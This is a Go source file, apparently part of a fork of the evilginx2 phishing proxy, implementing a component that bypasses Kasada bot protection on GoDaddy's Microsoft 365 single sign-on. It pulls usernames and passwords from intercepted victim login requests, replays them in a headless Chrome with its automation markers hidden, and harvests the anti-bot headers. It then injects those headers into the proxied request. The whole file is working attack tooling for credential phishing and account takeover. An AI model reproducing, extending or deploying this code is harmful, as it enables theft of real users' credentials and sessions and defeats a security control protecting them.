package core

import (
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/go-rod/rod"
	"github.com/go-rod/rod/lib/input"
	"github.com/go-rod/rod/lib/launcher"
	"github.com/go-rod/rod/lib/proto"
	"github.com/kgretzky/evilginx2/log"
)

// KasadaBypasser handles the headless browser automation to bypass GoDaddy SSO Kasada protection.
// This follows the same pattern as GoogleBypasser in evilpuppet.go
type KasadaBypasser struct {
	browser        *rod.Browser
	page           *rod.Page
	isHeadless     bool
	slowMotionTime time.Duration

	// Credentials captured from the victim's request
	username string
	password string

	// Kasada tokens captured from the headless browser
	kasadaHeaders map[string]string
}

// loginRequestBody is used to parse the credentials from the intercepted request.
type loginRequestBody struct {
	Username string `json:"username"`
	Password string `json:"password"`
	Plid     int    `json:"plid,omitempty"`
	Corrid   int    `json:"corrid,omitempty"`
}

// Launch starts a fresh Chrome instance for Kasada bypass
// UPDATED: Now uses go-rod launcher like GoogleBypasser (no port 9222 dependency)
func (k *KasadaBypasser) Launch() error {
	log.Important("[KasadaBypasser] 🚀 Starting Kasada bypass sequence...")
	log.Debug("[KasadaBypasser]: Launching fresh Chrome instance...")

	l := launcher.New().
		Headless(k.isHeadless).
		Set("disable-blink-features", "AutomationControlled").
		Set("disable-infobars", "").
		Set("window-size", "1920,1080")

	// Run as root if needed (for Docker containers)
	if os.Geteuid() == 0 {
		l = l.NoSandbox(true)
	}

	wsURL := l.MustLaunch()
	log.Debug("[KasadaBypasser]: ✅ Chrome launched at: %s", wsURL[:50]+"...")

	k.browser = rod.New().ControlURL(wsURL)
	if k.slowMotionTime > 0 {
		k.browser = k.browser.SlowMotion(k.slowMotionTime)
		log.Debug("[KasadaBypasser]: Slow motion enabled: %v", k.slowMotionTime)
	}

	if err := k.browser.Connect(); err != nil {
		log.Error("[KasadaBypasser]: ❌ Failed to connect to browser: %v", err)
		return err
	}
	log.Debug("[KasadaBypasser]: ✅ Connected to Chrome browser")

	k.page = k.browser.MustPage()
	log.Important("[KasadaBypasser] ✅ Browser launched, new page created")
	return nil
}

// GetCredentials extracts the username and password from the intercepted request body.
func (k *KasadaBypasser) GetCredentials(body []byte) error {
	var reqBody loginRequestBody
	if err := json.Unmarshal(body, &reqBody); err != nil {
		log.Error("[KasadaBypasser]: Failed to unmarshal request body: %v", err)
		return err
	}

	if reqBody.Username == "" || reqBody.Password == "" {
		return fmt.Errorf("username or password not found in request body")
	}

	k.username = reqBody.Username
	k.password = reqBody.Password
	log.Debug("[KasadaBypasser]: Extracted credentials for user: %s", k.username)
	return nil
}

// GetKasadaTokens performs the headless login and captures the Kasada headers.
// This is the core function that navigates to the real GoDaddy SSO page,
// enters the victim's credentials, and intercepts the x-kpsdk-* headers.
func (k *KasadaBypasser) GetKasadaTokens() error {
	stop := make(chan struct{})
	var once sync.Once
	timeout := time.After(60 * time.Second) // 60-second timeout for the whole operation

	k.kasadaHeaders = make(map[string]string)

	log.Important("[KasadaBypasser] 📡 Setting up network request listener for Kasada headers...")

	// Start listening for the network request that contains the Kasada headers.
	go k.page.EachEvent(func(e *proto.NetworkRequestWillBeSent) {
		// Log all requests to /v1/api/ for debugging
		if strings.Contains(e.Request.URL, "/v1/api/") {
			log.Debug("[KasadaBypasser]: 🌐 Network request: %s", e.Request.URL)
		}

		if strings.Contains(e.Request.URL, "/v1/api/pass/login") {
			log.Important("[KasadaBypasser] 🎯 INTERCEPTED login request to: %s", e.Request.URL)

			// Extract headers from the request
			// e.Request.Headers is map[string]gson.JSON - use .Str() to get string value
			headerCount := 0
			for key, val := range e.Request.Headers {
				headerName := strings.ToLower(key)
				if strings.HasPrefix(headerName, "x-kpsdk-") {
					strVal := val.Str()
					if strVal != "" {
						k.kasadaHeaders[headerName] = strVal
						headerCount++
						// Log truncated value for debugging
						displayLen := len(strVal)
						if displayLen > 50 {
							displayLen = 50
						}
						log.Success("[KasadaBypasser] 📦 Captured header #%d: %s = %s...", headerCount, headerName, strVal[:displayLen])
					}
				}
			}

			log.Important("[KasadaBypasser] 📊 Total Kasada headers captured: %d", len(k.kasadaHeaders))

			// Once we have at least the critical headers, we can stop.
			// Expected headers: x-kpsdk-ct, x-kpsdk-cd, x-kpsdk-h, x-kpsdk-v
			if len(k.kasadaHeaders) >= 2 { // At minimum we need ct and cd
				log.Success("[KasadaBypasser] ✅ Got enough headers, signaling completion...")
				once.Do(func() { close(stop) })
			}
		}
	})()

	// Navigate to the GoDaddy SSO page with O365 app context
	loginURL := "https://sso.godaddy.com/?app=o365&realm=pass"
	log.Important("[KasadaBypasser] 🌍 Navigating to: %s", loginURL)
	if err := k.page.Navigate(loginURL); err != nil {
		log.Error("[KasadaBypasser]: ❌ Failed to navigate: %v", err)
		return fmt.Errorf("failed to navigate to GoDaddy SSO page: %w", err)
	}

	// Wait for the page to load and elements to be ready.
	k.page.MustWaitLoad()
	log.Debug("[KasadaBypasser]: ✅ Page loaded, waiting 3s for Kasada JS to initialize...")
	time.Sleep(3 * time.Second) // Allow Kasada JS to initialize

	// Try multiple selectors for username field
	log.Debug("[KasadaBypasser]: 🔍 Looking for username field...")
	usernameField, err := k.findElement([]string{
		"#username",
		"input[name='username']",
		"input[type='email']",
		"input[id*='user']",
		"input[id*='email']",
	})
	if err != nil {
		log.Error("[KasadaBypasser]: ❌ Username field not found!")
		return fmt.Errorf("failed to find username field: %w", err)
	}
	log.Debug("[KasadaBypasser]: ✅ Found username field")

	log.Debug("[KasadaBypasser]: ⌨️ Entering username: %s", k.username)
	usernameField.MustInput(k.username)
	time.Sleep(500 * time.Millisecond)

	// Try multiple selectors for password field
	log.Debug("[KasadaBypasser]: 🔍 Looking for password field...")
	passwordField, err := k.findElement([]string{
		"#password",
		"input[name='password']",
		"input[type='password']",
		"input[id*='pass']",
	})
	if err != nil {
		log.Error("[KasadaBypasser]: ❌ Password field not found!")
		return fmt.Errorf("failed to find password field: %w", err)
	}
	log.Debug("[KasadaBypasser]: ✅ Found password field")

	log.Debug("[KasadaBypasser]: ⌨️ Entering password...")
	passwordField.MustInput(k.password)
	time.Sleep(500 * time.Millisecond)

	// Try multiple selectors for submit button
	log.Debug("[KasadaBypasser]: 🔍 Looking for submit button...")
	submitBtn, err := k.findElement([]string{
		"button[type='submit']",
		"#submitBtn",
		"button#submit",
		"input[type='submit']",
		"button[data-testid='submit']",
		".submit-button",
		"button:contains('Sign In')",
	})
	if err != nil {
		// If we can't find a button, try pressing Enter on the password field
		log.Warning("[KasadaBypasser]: ⚠️ Submit button not found, pressing Enter...")
		k.page.Keyboard.Press(input.Enter)
	} else {
		log.Debug("[KasadaBypasser]: ✅ Found submit button, clicking...")
		submitBtn.MustClick()
	}

	log.Important("[KasadaBypasser] ⏳ Waiting for Kasada tokens (timeout: 60s)...")

	// Wait for the tokens to be captured or timeout.
	select {
	case <-stop:
		log.Success("[KasadaBypasser] 🎉 Successfully captured %d Kasada headers!", len(k.kasadaHeaders))
		// Log all captured headers
		for name, value := range k.kasadaHeaders {
			displayLen := len(value)
			if displayLen > 30 {
				displayLen = 30
			}
			log.Debug("[KasadaBypasser]:   → %s: %s...", name, value[:displayLen])
		}
		// Close the page after capturing tokens
		if err := k.page.Close(); err != nil {
			log.Warning("[KasadaBypasser]: Failed to close page: %v", err)
		}
		return nil
	case <-timeout:
		log.Warning("[KasadaBypasser]: ⏰ Timeout reached!")
		if err := k.page.Close(); err != nil {
			log.Warning("[KasadaBypasser]: Failed to close page: %v", err)
		}
		// If we captured some headers, still return success
		if len(k.kasadaHeaders) > 0 {
			log.Warning("[KasadaBypasser]: ⚠️ Timeout but captured %d headers, proceeding anyway...", len(k.kasadaHeaders))
			return nil
		}
		log.Error("[KasadaBypasser]: ❌ No Kasada headers captured!")
		return fmt.Errorf("timed out waiting for Kasada headers")
	}
}

// findElement tries multiple selectors and returns the first matching element.
func (k *KasadaBypasser) findElement(selectors []string) (*rod.Element, error) {
	for _, selector := range selectors {
		elem, err := k.page.Timeout(2 * time.Second).Element(selector)
		if err == nil && elem != nil {
			log.Debug("[KasadaBypasser]: Found element with selector: %s", selector)
			return elem, nil
		}
	}
	return nil, fmt.Errorf("no element found with any of the provided selectors")
}

// InjectKasadaHeaders adds the captured headers to the original proxied request.
func (k *KasadaBypasser) InjectKasadaHeaders(req *http.Request) {
	if len(k.kasadaHeaders) == 0 {
		log.Warning("[KasadaBypasser]: No Kasada headers were captured. Injection skipped.")
		return
	}

	for name, value := range k.kasadaHeaders {
		// Use the original case for the header name
		headerName := k.normalizeHeaderName(name)
		req.Header.Set(headerName, value)
		log.Debug("[KasadaBypasser]: Injected header '%s' into original request.", headerName)
	}
	log.Info("[KasadaBypasser]: Injected %d Kasada headers into the request.", len(k.kasadaHeaders))
}

// normalizeHeaderName converts lowercase header names back to proper case.
func (k *KasadaBypasser) normalizeHeaderName(name string) string {
	// Map of known Kasada headers with proper casing
	headerMap := map[string]string{
		"x-kpsdk-ct": "x-kpsdk-ct",
		"x-kpsdk-cd": "x-kpsdk-cd",
		"x-kpsdk-h":  "x-kpsdk-h",
		"x-kpsdk-v":  "x-kpsdk-v",
	}

	if proper, ok := headerMap[strings.ToLower(name)]; ok {
		return proper
	}
	return name
}

// Close cleans up the browser instance
func (k *KasadaBypasser) Close() {
	if k.browser != nil {
		k.browser.MustClose()
		log.Debug("[KasadaBypasser] Browser closed")
	}
}

// GetCapturedHeaders returns the captured Kasada headers for inspection.
func (k *KasadaBypasser) GetCapturedHeaders() map[string]string {
	return k.kasadaHeaders
}
